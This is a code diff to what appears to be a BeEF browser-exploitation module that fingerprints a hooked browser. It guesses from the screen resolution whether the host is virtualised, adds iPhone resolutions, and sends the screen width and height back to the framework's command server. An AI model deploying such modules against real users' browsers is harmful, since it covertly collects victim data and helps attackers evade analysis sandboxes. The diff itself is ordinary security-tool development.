@@ -12,25 +12,29 @@ beef.execute(function() {
 
 	var result;
 	var dimensions = {
-	'320, 200' : '',
-	'320, 240' : '',
-	'640, 480' : '',
-	'800, 480' : '',
-	'768, 576' : '',
-	'854, 480' : '',
-	'1024, 600' : '',
-	'1152, 768' : '',
-	'800, 600' : '',
-	'1024, 768' : '',
-	'1280, 854' : '',
-	'1280, 960' : '',
+	'320, 200'   : '',
+	'320, 240'   : '',
+	'320, 480'   : '', // iPhone 4S and earlier
+	'480, 320'   : '', // iPhone 4S and earlier
+	'640, 480'   : '',
+	'640, 1136'  : '', // iPhone 5
+	'800, 480'   : '',
+	'768, 576'   : '',
+	'854, 480'   : '',
+	'1024, 600'  : '',
+	'1136, 640'  : '', // iPhone 5
+	'1152, 768'  : '',
+	'800, 600'   : '',
+	'1024, 768'  : '',
+	'1280, 854'  : '',
+	'1280, 960'  : '',
 	'1280, 1024' : '',
-	'1280, 720' : '',
-	'1280, 768' : '',
-	'1366, 768' : '',
-	'1280, 800' : '',
-	'1440, 900' : '',
-	'1440, 960' : '',
+	'1280, 720'  : '',
+	'1280, 768'  : '',
+	'1366, 768'  : '',
+	'1280, 800'  : '',
+	'1440, 900'  : '',
+	'1440, 960'  : '',
 	'1400, 1050' : '',
 	'1600, 1200' : '',
 	'2048, 1536' : '',
@@ -46,11 +50,15 @@ beef.execute(function() {
 
 	if (dimensions[wh] != undefined) {
 		result = "Not virtualized";
+	} else if (beef.hardware.isVirtualMachine()) {
+		result = "Virtualized";
+	} else if (beef.hardware.isMobilePhone()) {
+		result = "Not virtualized";
 	} else {
 		result = "This host is virtualized or uses an unrecognized screen resolution";
 	}
 
-	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result);
+	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result+"&w="+screen.width+"&h="+screen.height);
 
 });
 
